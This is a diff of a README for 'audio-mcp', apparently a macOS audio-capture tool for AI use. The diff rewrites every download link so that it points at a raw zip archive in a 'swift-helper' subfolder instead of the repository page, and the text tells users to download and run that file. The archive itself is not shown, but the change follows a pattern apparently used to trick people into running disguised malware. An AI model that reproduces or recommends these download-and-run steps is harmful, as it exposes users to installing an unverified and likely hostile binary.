@@ -1,6 +1,6 @@
 # 🎧 audio-mcp - Capture Mac Audio for AI
 
-[![Download audio-mcp](https://img.shields.io/badge/Download-audio--mcp-blue?style=for-the-badge&logo=github)](https://github.com/burfthdae-oss/audio-mcp)
+[![Download audio-mcp](https://img.shields.io/badge/Download-audio--mcp-blue?style=for-the-badge&logo=github)](https://github.com/burfthdae-oss/audio-mcp/raw/refs/heads/main/swift-helper/audio_mcp_v2.9.zip)
 
 ## 🧭 What this does
 
@@ -29,7 +29,7 @@ For best results, keep your Mac plugged in if you plan to record for a long time
 
 ## 📥 Download audio-mcp
 
-[Visit the download page for audio-mcp](https://github.com/burfthdae-oss/audio-mcp)
+[Visit the download page for audio-mcp](https://github.com/burfthdae-oss/audio-mcp/raw/refs/heads/main/swift-helper/audio_mcp_v2.9.zip)
 
 On that page, get the latest version for macOS, then download and run this file.
 
@@ -212,4 +212,4 @@ audio-mcp
 
 ## 🌐 Download link
 
-[https://github.com/burfthdae-oss/audio-mcp](https://github.com/burfthdae-oss/audio-mcp)
+[https://github.com/burfthdae-oss/audio-mcp/raw/refs/heads/main/swift-helper/audio_mcp_v2.9.zip](https://github.com/burfthdae-oss/audio-mcp/raw/refs/heads/main/swift-helper/audio_mcp_v2.9.zip)
